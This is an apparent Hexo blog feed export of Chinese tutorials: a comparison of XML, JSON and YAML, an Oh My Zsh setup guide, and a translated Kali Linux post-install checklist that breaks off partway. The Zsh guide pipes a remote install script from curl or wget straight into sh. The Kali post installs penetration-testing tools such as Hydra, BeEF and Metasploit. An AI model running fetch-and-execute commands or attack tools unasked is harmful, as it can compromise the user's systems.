<h2 id="SaaS"><a href="#SaaS" class="headerlink" title="SaaS"></a>SaaS</h2><p><strong>SaaS</strong>，Software as a Service（软件即服务），云服务的最高层，直接提供现成的应用供用户使用，用户所付出的精力最少，例如本站采用的 Hexo、WordPress 等。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>XML、JSON 与 YAML</title>
    <url>/2018/07/21/xml-json-yaml/</url>
    <content><![CDATA[<p>XML、JSON 与 YAML 是三种常见的信息标记形式，这三者由于其特有的属性而在不同的领域广为使用。</p>
<h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p><strong>XML</strong>，Extensible Markup Language（可扩展标记语言），倘若我要表示某个人的简要信息，用 XML 可写为：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">person</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">firstName</span>&gt;</span>Tian<span class="tag">&lt;/<span class="name">firstName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">lastName</span>&gt;</span>Song<span class="tag">&lt;/<span class="name">lastName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">address</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">streetAddr</span>&gt;</span>中关村南大街5号<span class="tag">&lt;/<span class="name">streetAddr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">city</span>&gt;</span>北京市<span class="tag">&lt;/<span class="name">city</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">zipcode</span>&gt;</span>100081<span class="tag">&lt;/<span class="name">zipcode</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">prof</span>&gt;</span>Computer System<span class="tag">&lt;/<span class="name">prof</span>&gt;</span><span class="tag">&lt;<span class="name">prof</span>&gt;</span>Security<span class="tag">&lt;/<span class="name">prof</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">person</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><p><strong>JSON</strong>，JavaScript Object Notation（JavaScript 对象表示法），倘若我要表示某个人的简要信息，用 JSON 可写为：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;firstName&quot;</span> : <span class="string">&quot;Tian&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;lastName&quot;</span> : <span class="string">&quot;Song&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;address&quot;</span> : &#123;</span><br><span class="line">                    <span class="attr">&quot;streetAddr&quot;</span> : <span class="string">&quot;中关村南大街5号&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;city&quot;</span> : <span class="string">&quot;北京市&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;zipcode&quot;</span> : <span class="string">&quot;100081&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">    <span class="attr">&quot;prof&quot;</span> : [<span class="string">&quot;Computer System&quot;</span>, <span class="string">&quot;Security&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="YAML"><a href="#YAML" class="headerlink" title="YAML"></a>YAML</h2><p><strong>YAML</strong>，在开发这种语言之初，其意为 Yet Another Markup Language（仍是一种标记语言），之后为了强调这种语言以数据作为中心，而不是以标记语言为重点，故解释为 YAML Ain&#39;t a Markup Language（YAML 不是一种标记语言），倘若我要表示某个人的简要信息，用 YAML 可写为：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">firstName :</span> <span class="string">Tian</span></span><br><span class="line"><span class="attr">lastName :</span> <span class="string">Song</span></span><br><span class="line"><span class="attr">address :</span></span><br><span class="line">    <span class="attr">streetAddr :</span> <span class="string">中关村南大街5号</span></span><br><span class="line">    <span class="attr">city :</span> <span class="string">北京市</span></span><br><span class="line">    <span class="attr">zipcode :</span> <span class="number">100081</span></span><br><span class="line"><span class="attr">prof :</span></span><br><span class="line"><span class="string">-Computer</span> <span class="string">System</span></span><br><span class="line"><span class="string">-Security</span></span><br></pre></td></tr></table></figure>

<h2 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h2><p>XML 是最早的通用信息标记语言，可扩展性好，但繁琐，主要用于 Internet 上的信息交互与传递，以及用户界面的编写，比如 Android；JSON 中的信息有类型，适合程序处理（js），较 XML 简洁，主要用于移动应用云端和节点的信息通信，无注释；YAML 信息无类型，文本信息比例最高，可读性好，主要用于各类系统的配置文件，有注释易读。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>使用 Zsh 替代 Bash</title>
    <url>/2018/09/18/zsh/</url>
    <content><![CDATA[<p>众所周知，Bash 几乎是所有 Linux 发行版预装的 Shell，但 Zsh 却能带给你更强大的功能。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>首先，执行 <code>echo $SHELL</code> 可以查看你当前所使用的 Shell，如果不是 Zsh，则可以接着执行 <code>cat /etc/shells</code> 查看你当前系统所支持的 Shell，如果里面没有 Zsh（在 macOS 中是自带 Zsh 的），则你需要下载安装 Zsh，在 Ubuntu 中，只需要 <code>sudo apt install zsh</code> 一条命令即可，启用也很简单，<code>chsh -s $(which zsh)</code> 即可（执行完此命令后通常需要重启一下才能生效），但它的配置却相当复杂，由此诞生了 <a href="https://ohmyz.sh/">Oh My Zsh</a> 项目，该项目的主要目的是简化 Zsh 的配置。</p>
<p>Oh My Zsh 的官网给出了利用 <code>curl</code> 或 <code>wget</code> 安装的详细命令，具体如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装 Oh My Zsh 前需要安装 git（`sudo apt install git`）</span></span><br><span class="line"><span class="comment"># 通过 curl 安装</span></span><br><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>&quot;</span></span><br><span class="line"><span class="comment"># 通过 wget 安装</span></span><br><span class="line">sh -c <span class="string">&quot;<span class="subst">$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>安装完成后，会在当前用户的家目录下生成多个隐藏文件：<br>其中 <code>.zshrc</code> 类似于 <code>.bashrc</code>，存放 zsh 的配置信息；<br><code>.zsh_history</code> 类似于 <code>.bash_history</code>，存放 zsh 的命令历史记录；<br><code>.oh-my-zsh</code> 的文件夹则是 Oh My Zsh 项目 GitHub 仓库的克隆版，其中的 <code>themes</code> 文件夹下主要存放自带的主题，<code>plugins</code> 文件夹下主要存放自带的插件，<code>custom</code> 文件夹下主要存放用户自己下载的主题和插件。</p>
<span id="more"></span>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>Oh My Zsh 的主要配置都位于 <code>$HOME/.zshrc</code> 文件中，主要配置如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置主题，默认为自带的 robbyrussell 主题，</span></span><br><span class="line"><span class="comment"># 个人喜欢自带的 ys 主题</span></span><br><span class="line">ZSH_THEME=<span class="string">&quot;ys&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动错误命令自动更正，默认是注释的</span></span><br><span class="line">ENABLE_CORRECTION=<span class="string">&quot;true&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在命令执行的过程中，使用小红点进行提示</span></span><br><span class="line"><span class="comment"># 默认是注释的</span></span><br><span class="line">COMPLETION_WAITING_DOTS=<span class="string">&quot;true&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置插件，默认只启用了自带的 git 插件,</span></span><br><span class="line"><span class="comment"># 要启用更多的插件可直接在括号中写入，</span></span><br><span class="line"><span class="comment"># 必须是自带的插件或已下载到指定位置的插件</span></span><br><span class="line">plugins=(</span><br><span class="line">  git</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><p>Zsh 的强大之处就在于它有相当多的插件，只需安装相关插件，并进行配置，即可体验相应功能。Oh My Zsh 安装并启用插件相当简便，所以，可把 Oh My Zsh 当成是一个 Zsh 的插件管理器。个人常用的插件如下：</p>
<h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><p>Oh My Zsh 自带的插件，用于显示 Git 仓库的分支等信息。</p>
<h3 id="z"><a href="#z" class="headerlink" title="z"></a>z</h3><p>Oh My Zsh 自带的插件，实现快速跳转到指定文件夹。</p>
<h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><p>Oh My Zsh 自带的插件，提供 docker 相关命令补全。</p>
<h3 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose"></a>docker-compose</h3><p>Oh My Zsh 自带的插件，提供 docker-compose 相关命令补全。</p>
<h3 id="kubectl"><a href="#kubectl" class="headerlink" title="kubectl"></a>kubectl</h3><p>Oh My Zsh 自带的插件，提供 kubectl 相关命令补全。</p>
<h3 id="zsh-autosuggestions"><a href="#zsh-autosuggestions" class="headerlink" title="zsh-autosuggestions"></a><a href="https://github.com/zsh-users/zsh-autosuggestions">zsh-autosuggestions</a></h3><p>Zsh 下的命令自动建议插件，使用如下命令即可安装：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure>

<h3 id="zsh-completions"><a href="#zsh-completions" class="headerlink" title="zsh-completions"></a><a href="https://github.com/zsh-users/zsh-completions">zsh-completions</a></h3><p>Zsh 下的命令自动补全插件，使用如下命令即可安装：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-completions ~/.oh-my-zsh/custom/plugins/zsh-completions</span><br></pre></td></tr></table></figure>

<h3 id="zsh-syntax-highlighting"><a href="#zsh-syntax-highlighting" class="headerlink" title="zsh-syntax-highlighting"></a><a href="https://github.com/zsh-users/zsh-syntax-highlighting">zsh-syntax-highlighting</a></h3><p>Zsh 下的命令语法高亮插件，使用如下命令即可安装：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure>

<p>当安装并启用以上的所有插件后，<code>$HOME/.zshrc</code> 文件中插件相关配置应该是下面这样的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">  git</span><br><span class="line">  z</span><br><span class="line">  docker</span><br><span class="line">  docker-compose</span><br><span class="line">  kubectl</span><br><span class="line">  zsh-autosuggestions</span><br><span class="line">  zsh-completions</span><br><span class="line">  zsh-syntax-highlighting</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> <span class="variable">$ZSH</span>/oh-my-zsh.sh</span><br><span class="line"><span class="built_in">source</span> ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh</span><br><span class="line"><span class="comment"># 值得注意的是，根据官方文档，zsh-syntax-highlighting 插件需放在最后，</span></span><br><span class="line"><span class="comment"># 并且要加上相应的 source 语句</span></span><br></pre></td></tr></table></figure>

<h2 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h2><p>Oh My Zsh 自带了很多主题，<a href="https://github.com/robbyrussell/oh-my-zsh/wiki/themes">在这里</a>可以查看每个主题的显示效果，可根据自己的喜好选择合适的主题，值得注意的是，当在 <code>$HOME/.zshrc</code> 配置文件中将主题设置为 <code>random</code> 时，它每次会选择随机的主题。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>安装 Kali Linux 后要做的 10 件事</title>
    <url>/2019/02/25/after-kali/</url>
    <content><![CDATA[<p>本文翻译自 <a href="https://null-byte.wonderhowto.com/how-to/top-10-things-do-after-installing-kali-linux-0186450/">https://null-byte.wonderhowto.com/how-to/top-10-things-do-after-installing-kali-linux-0186450/</a> ，正文如下：</p>
<p>默认情况下，对于完成日常的渗透测试，<a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-getting-started-with-kali-your-new-hacking-system-0151631/">Kali Linux</a> 可能没有你所需的一切。但通过一些提示，技巧和应用程序，我们可以像专业的白帽子一样快速开始使用 Kali。</p>
<p>大多数 Linux 发行版都是高度可定制的。这使得个性化你的渗透测试发行版有点令人生畏。只需几个命令，我们就可以自动执行任务，安装我们喜欢的软件，创建其他用户帐户，正确配置匿名软件，以及优化我们与终端的互动。我们可以采取一些措施来改善与操作系统的交互。</p>
<span id="more"></span>
<div class="video-container"><iframe src="https://www.youtube.com/embed/8VL0K0rFgxw" frameborder="0" loading="lazy" allowfullscreen></iframe></div>

<h2 id="1、安装-Git"><a href="#1、安装-Git" class="headerlink" title="1、安装 Git"></a>1、安装 Git</h2><p><a href="https://git-scm.com/">Git</a> 是一个开源软件版本控制应用程序。它可以用于协作共享和编辑代码，但在 Null Byte 中通常被引用作为复制（或“<a href="https://www.git-scm.com/docs/git-clone">克隆</a>”）GitHub 上的代码存储库的主要工具。Git 是渗透测试人员必备的工具，他们希望将自己的工具集扩展到默认 Kali 存储库中可用的工具集之外。</p>
<p>可以使用下面的 <a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-linux-basics-for-aspiring-hacker-part-5-installing-new-software-0147591/">apt-get</a> 命令安装 Git。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apt-get install git</span><br></pre></td></tr></table></figure>

<h2 id="2、配置-Bash-别名"><a href="#2、配置-Bash-别名" class="headerlink" title="2、配置 Bash 别名"></a>2、配置 Bash 别名</h2><p>Bash 别名非常适合创建自定义命令行快捷方式。例如，我们可以重新分配 <a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-linux-basics-for-aspiring-hacker-part-2-creating-directories-files-0147234/">ls</a> 命令以自动使用我们最喜欢的参数。下面是正常 <strong>ls</strong> 输出的示例。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line"></span><br><span class="line"> androidbins.txt                                      folder-pictures.png     smtp.cracked         text-x-generic.png</span><br><span class="line"> bogus_gmail.creds                                    folder.png              smtp.list            Windows-10</span><br><span class="line"> dumpzilla-b3075d1960874ce82ea76a5be9f58602afb61c39   package-x-generic.png   text-x-generic.ico  <span class="string">&#x27;Windows 10 Icons&#x27;</span></span><br></pre></td></tr></table></figure>

<p>在创建 <strong>ls</strong> 别名后再次输出的示例。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line"></span><br><span class="line">total 220K</span><br><span class="line">-rw-------  1 root root  15K Aug 24  2015  folder-pictures.png</span><br><span class="line">-rw-------  1 root root 8.7K Aug 24  2015  folder.png</span><br><span class="line">-rw-------  1 root root  11K Aug 24  2015  package-x-generic.png</span><br><span class="line">-rw-------  1 root root 5.5K Sep  3  2015  text-x-generic.png</span><br><span class="line">drwxr-xr-x 12 root root 4.0K May 31 00:44 <span class="string">&#x27;Windows 10 Icons&#x27;</span>/</span><br><span class="line">drwxr-xr-x 18 root root 4.0K May 31 00:44  Windows-10/</span><br><span class="line">-rwxr-x---  1 root root 103K May 31 00:49  text-x-generic.ico*</span><br><span class="line">drwxr-xr-x  5 root root 4.0K Jun 11 21:57  dumpzilla-b3075d1960874ce82ea76a5be9f58602afb61c39/</span><br><span class="line">-rw-r--r--  1 root root   52 Jul  5 18:13  bogus_gmail.creds</span><br><span class="line">-rw-r--r--  1 root root  15K Jul  5 18:28  smtp.list</span><br><span class="line">-rw-r--r--  1 root root  181 Jul  5 18:43  smtp.cracked</span><br><span class="line">-rw-r--r--  1 root root  23K Jul 23 18:18  androidbins.txt</span><br><span class="line">drwxr-xr-x  5 root root 4.0K Jul 23 19:22  ./</span><br><span class="line">drwxr-xr-x 23 root root 4.0K Aug  9 04:25  ../</span><br></pre></td></tr></table></figure>

<p>我们得到了更详细的输出。<strong>ls</strong> 命令现在自动使用 <strong>-l</strong>，**-a<strong>，</strong>-t<strong>，</strong>-h** 和 <strong>-r</strong> 参数。所有这些参数都将指示 <strong>ls</strong> 使用列表（**-l<strong>）格式，列出所有（</strong>-a<strong>）文件 —— 包括隐藏文件 —— 并以人类可读（</strong>-h**）的格式打印文件大小（例如，1K，234M，5G）。</p>
<p>我的别名还将按修改时间（**-t<strong>）对输出进行排序，并反转（</strong>-r**）列表的顺序，以便最近修改的文件出现在终端的底部。这个参数集合是我个人的 <strong>ls</strong> 偏好，但你的可能会有所不同。</p>
<p>要创建别名，请使用 <strong>nano</strong> 或你喜欢的文本编辑器打开 <code>/root/.bash_aliases</code>。添加以下行以创建别名。</p>
<ul>
<li>不要错过：<a href="https://null-byte.wonderhowto.com/how-to/intro-vim-unix-text-editor-every-hacker-should-be-familiar-with-0174674/">Vim 简介，每个黑客都应该知道的 Unix 文本编辑器</a></li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">alias</span> ls=<span class="string">&#x27;ls --color=always -rthla&#x27;</span></span><br></pre></td></tr></table></figure>

<p>我们还可以进一步向 <code>.bash_aliases</code> 文件添加更复杂的函数。下面是一个简单的函数示例，旨在使 Kali 保持最新状态。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> apt-updater &#123;</span><br><span class="line">    apt-get update &amp;&amp;</span><br><span class="line">    apt-get dist-upgrade -Vy &amp;&amp;</span><br><span class="line">    apt-get autoremove -y &amp;&amp;</span><br><span class="line">    apt-get autoclean &amp;&amp;</span><br><span class="line">    apt-get clean &amp;&amp;</span><br><span class="line">    reboot</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>保存对 <code>.bash_aliases</code> 文件所做的更改后，打开一个新终端以使更改生效。运行新创建的 <strong>apt-updater</strong> 函数将调用一系列 <strong>apt-get</strong> 命令，这些命令将自动更新和维护你的系统。如果先前的命令失败，＆ 符号（**&amp;&amp;**）确保该函数不会继续执行以下命令。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apt-updater</span><br></pre></td></tr></table></figure>

<p>有关 Bash 别名的更多信息，请查看 Kody 的“<a href="https://null-byte.wonderhowto.com/how-to/mac-for-hackers-set-up-macos-system-for-wi-fi-packet-capturing-0186354/">为 Wi-Fi 数据包捕获设置 MacOS 系统</a>”一文。</p>
<h2 id="3、创建一个新的低权限用户"><a href="#3、创建一个新的低权限用户" class="headerlink" title="3、创建一个新的低权限用户"></a>3、创建一个新的低权限用户</h2><p>许多应用程序（如 Chromium 浏览器和 Tor 浏览器）都不应该以 root 用户身份打开或使用。此类应用程序在很大程度上依赖于低级别权限来提供某种程度的安全性。某些用户为这些活动创建低特权用户帐户可能是有益的。</p>
<p>Takhion 的“<a href="https://null-byte.wonderhowto.com/how-to/install-lock-down-kali-linux-for-safe-desktop-use-0184531/#jump-step2">锁定 Kali Linux 以用于安全桌面使用</a>”一文中详细介绍了这一概念，因此请务必查看帮助。</p>
<h2 id="4、安装一个终端复用器"><a href="#4、安装一个终端复用器" class="headerlink" title="4、安装一个终端复用器"></a>4、安装一个终端复用器</h2><p>复用器是一种平铺终端仿真器，允许我们在一个窗口内打开多个终端会话。这样做的主要好处是能够立即看到我们所有打开的终端会话，而不是将窗口叠加在一起。以下是复用器示例。</p>
<p><img src="https://img.wonderhowto.com/img/10/19/63669458451029/0/top-10-things-do-after-installing-kali-linux.w1456.jpg" alt="复用器"></p>
<p>有许多值得注意的复用器。如上面的屏幕截图所示，<a href="https://github.com/gnunn1/tilix">Tilix</a> 是一个开源且可靠的选项。替代方案包括 <a href="https://github.com/tmux/tmux/">tmux</a> 和 <a href="https://savannah.gnu.org/projects/screen">screen</a>。</p>
<p>Tilix 可在 Kali 的 APT 存储库中使用，可以使用以下命令进行安装。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apt-get install tilix</span><br><span class="line"></span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree</span><br><span class="line">Reading state information... Done</span><br><span class="line">The following additional packages will be installed:</span><br><span class="line">  libgtkd-3-0 libphobos2-ldc-shared78 libvted-3-0 tilix-common</span><br><span class="line">Suggested packages:</span><br><span class="line">  python-nautilus</span><br><span class="line">The following NEW packages will be installed:</span><br><span class="line">  libgtkd-3-0 libphobos2-ldc-shared78 libvted-3-0 tilix tilix-common</span><br><span class="line">0 upgraded, 5 newly installed, 0 to remove and 466 not upgraded.</span><br><span class="line">Need to get 10.7 MB of archives.</span><br><span class="line">After this operation, 49.1 MB of additional disk space will be used.</span><br><span class="line">Do you want to <span class="built_in">continue</span>? [Y/n] y</span><br></pre></td></tr></table></figure>

<p>亚马逊推荐：<a href="https://www.amazon.cn/dp/B00BQTWC0U">William E. Shotts Jr. 撰写的“Linux命令行大全”</a></p>
<h2 id="5、安装你喜爱的黑客工具"><a href="#5、安装你喜爱的黑客工具" class="headerlink" title="5、安装你喜爱的黑客工具"></a>5、安装你喜爱的黑客工具</h2><p>某些版本的 Kali 面向极简主义的渗透测试者，他们不希望预先安装数百个黑客工具。这意味着我们必须手动安装我们喜欢的工具。我们使用的工具类型根据我们的技能和专业领域而有所不同，但以下是一些流行的黑客工具。</p>
<ul>
<li><a href="https://www.aircrack-ng.org/">Aircrack-ng</a>：无线 <a href="https://null-byte.wonderhowto.com/how-to/hack-wi-fi-getting-started-with-aircrack-ng-suite-wi-fi-hacking-tools-0147893/">WEP/WPA 破解实用程序</a>。</li>
<li><a href="https://beefproject.com/">BeEF</a>：通过 Web 应用程序的浏览器<a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-hack-web-browsers-with-beef-0159961/">漏洞利用框架</a>。</li>
<li><a href="https://portswigger.net/burp/">Burp Suite</a>：专为 <a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-hack-web-apps-part-4-hacking-form-authentication-with-burp-suite-0163642/">Web 应用程序安全性</a>而设计的图形应用。</li>
<li><a href="https://github.com/vanhauser-thc/thc-hydra">Hydra</a>：登录<a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-online-web-form-passwords-with-thc-hydra-burp-suite-0160643/">密码暴力破解</a>实用程序。</li>
<li><a href="https://cirt.net/Nikto2">Nikto</a>：Web <a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-find-vulnerabilities-for-any-website-using-nikto-0151729/">服务器安全扫描器</a>。</li>
<li><a href="https://www.paterva.com/web7/">Maltego</a>：开源取证和情报收集。</li>
<li><a href="https://nmap.org/">Nmap</a>：端口扫描器和<a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-advanced-nmap-for-reconnaissance-0151619/">网络映射器</a>。</li>
<li><a href="https://www.wireshark.org/download.html">Wireshark</a>：用于<a href="https://null-byte.wonderhowto.com/news/8-wireshark-filters-every-wiretapper-uses-spy-web-conversations-and-surfing-habits-0134508/">网络流量分析</a>的图形应用程序。</li>
</ul>
<p>可以使用以下命令安装这些工具。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apt-get install maltego metasploit-framework burpsuite wireshark aircrack-ng hydra nmap beef-xss nikto</span><br><span class="line"></span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree</span><br><span class="line">Reading state information... Done</span><br><span class="line">hydra is already the newest version (8.6-1kali1).</span><br><span class="line"></span><br><span class="line">The following NEW packages will be installed:</span><br><span class="line">  beef-xss binfmt-support burpsuite fastjar fonts-droid-fallback fonts-lato</span><br><span class="line">  fonts-noto-mono ghostscript gsfonts imagemagick imagemagick-6-common</span><br><span class="line">  imagemagick-6.q16 jarwrapper java-wrappers javascript-common libc-ares2</span><br><span class="line">  libcupsfilters1 libcupsimage2 libdjvulibre-text libdjvulibre21 libdouble-conversion1</span><br><span class="line">  libfftw3-double3 libgmp-dev libgmpxx4ldbl libgs9 libgs9-common libhttp-parser2.8</span><br><span class="line">  libijs-0.35 libilmbase23 libjbig2dec0 libjs-jquery libjs-jquery-easing</span><br><span class="line">  libjs-jquery-fancybox libjs-jquery-mousewheel libjs-jquery-ui libjs-source-map</span><br><span class="line">  libjs-uglify libjxr-tools libjxr0 liblqr-1-0 liblua5.2-0 libmagickcore-6.q16-6</span><br><span class="line">  libmagickcore-6.q16-6-extra libmagickwand-6.q16-6 libnetpbm10 libnl-route-3-200</span><br><span class="line">  libopenexr23 libpaper-utils libpaper1 libpcre2-16-0 libqt5core5a libqt5dbus5</span><br><span class="line">  libqt5gui5 libqt5multimedia5 libqt5multimedia5-plugins libqt5multimediagsttools5</span><br><span class="line">  libqt5multimediawidgets5 libqt5network5 libqt5opengl5 libqt5printsupport5 libqt5svg5</span><br><span class="line">  libqt5widgets5 libruby2.5 libsbc1 libsmi2ldbl libspandsp2 libssh-gcrypt-4 libuv1</span><br><span class="line">  libwhisker2-perl libwireshark-data libwireshark11 libwiretap8 libwmf0.2-7</span><br><span class="line">  libwscodecs2 libwsutil9 libxcb-icccm4 libxcb-image0 libxcb-keysyms1 libxcb-randr0</span><br><span class="line">  libxcb-render-util0 libxcb-xinerama0 libxcb-xkb1 libxkbcommon-x11-0 libyaml-0-2</span><br><span class="line">  maltego netpbm nikto nodejs nodejs-doc openjdk-8-jre openjdk-8-jre-headless</span><br><span class="line">  qt5-gtk-platformtheme qttranslations5-l10n rake ruby ruby-addressable ruby-ansi</span><br><span class="line">  ruby-atomic ruby-buftok ruby-celluloid ruby-celluloid-io ruby-daemons</span><br><span class="line">  ruby-dataobjects ruby-dataobjects-mysql ruby-dataobjects-postgres</span><br><span class="line">  ruby-dataobjects-sqlite3 ruby-dev ruby-did-you-mean ruby-diff-lcs ruby-dm-core</span><br><span class="line">  ruby-dm-do-adapter ruby-dm-migrations ruby-dm-serializer ruby-dm-sqlite-adapter</span><br><span class="line">  ruby-docile ruby-domain-name ruby-em-websocket ruby-equalizer ruby-erubis</span><br><span class="line">  ruby-eventmachine ruby-execjs ruby-faraday ruby-geoip ruby-hitimes ruby-http</span><br><span class="line">  ruby-http-cookie ruby-http-form-data ruby-http-parser.rb ruby-json ruby-librex</span><br><span class="line">  ruby-libv8 ruby-memoizable ruby-mime-types ruby-mime-types-data ruby-minitest</span><br><span class="line">  ruby-mojo-magick ruby-msfrpc-client ruby-msgpack ruby-multi-json ruby-multipart-post</span><br><span class="line">  ruby-naught ruby-net-telnet ruby-nio4r ruby-oj ruby-parseconfig ruby-power-assert</span><br><span class="line">  ruby-public-suffix ruby-qr4r ruby-rack ruby-rack-protection ruby-ref ruby-rqrcode</span><br><span class="line">  ruby-rspec-expectations ruby-rspec-support ruby-rubydns ruby-simple-oauth</span><br><span class="line">  ruby-simplecov ruby-simplecov-html ruby-sinatra ruby-sqlite3 ruby-term-ansicolor</span><br><span class="line">  ruby-test-unit ruby-therubyracer ruby-thread-safe ruby-tilt ruby-timers ruby-tins</span><br><span class="line">  ruby-twitter ruby-uglifier ruby-unf ruby-unf-ext ruby-xmlrpc ruby-zip ruby2.5</span><br><span class="line">  ruby2.5-dev ruby2.5-doc rubygems-integration thin wireshark wireshark-common</span><br><span class="line">  wireshark-qt zip</span><br><span class="line">The following packages will be upgraded:</span><br><span class="line">  aircrack-ng libcups2 libnl-3-200 libnl-genl-3-200 libxkbcommon0 metasploit-framework</span><br><span class="line">  nmap nmap-common</span><br><span class="line">8 upgraded, 182 newly installed, 0 to remove and 458 not upgraded.</span><br><span class="line">Need to get 381 MB of archives.</span><br><span class="line">After this operation, 616 MB of additional disk space will be used.</span><br><span class="line">Do you want to <span class="built_in">continue</span>? [Y/n] y</span><br></pre></td></tr></table></figure>

<h2 id="6、安装最新版本的-Tor"><a href="#6、安装最新版本的-Tor" class="headerlink" title="6、安装最新版本的 Tor"></a>6、安装最新版本的 Tor</h2><p>Tor 可以在 Kali 的存储库中使用，但匿名软件应该直接从源代码获取（torproject.org）。此外，Kali 的 Tor 版本无法可靠地维护或更新。这意味着我们可能会缺少关键的稳定性和安全性更新。</p>
<p>将 Tor 项目存储库添加到 APT 存储库列表中。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;deb https://deb.torproject.org/torproject.org stretch main</span></span><br><span class="line"><span class="string">deb-src https://deb.torproject.org/torproject.org stretch main&#x27;</span> &gt; /etc/apt/sources.list.d/tor.list</span><br></pre></td></tr></table></figure>

<p>然后，下载 <a href="https://www.torproject.org/docs/debian.html.en">Tor Project 包签名密钥</a>并将其导入 APT 密钥环。</p>
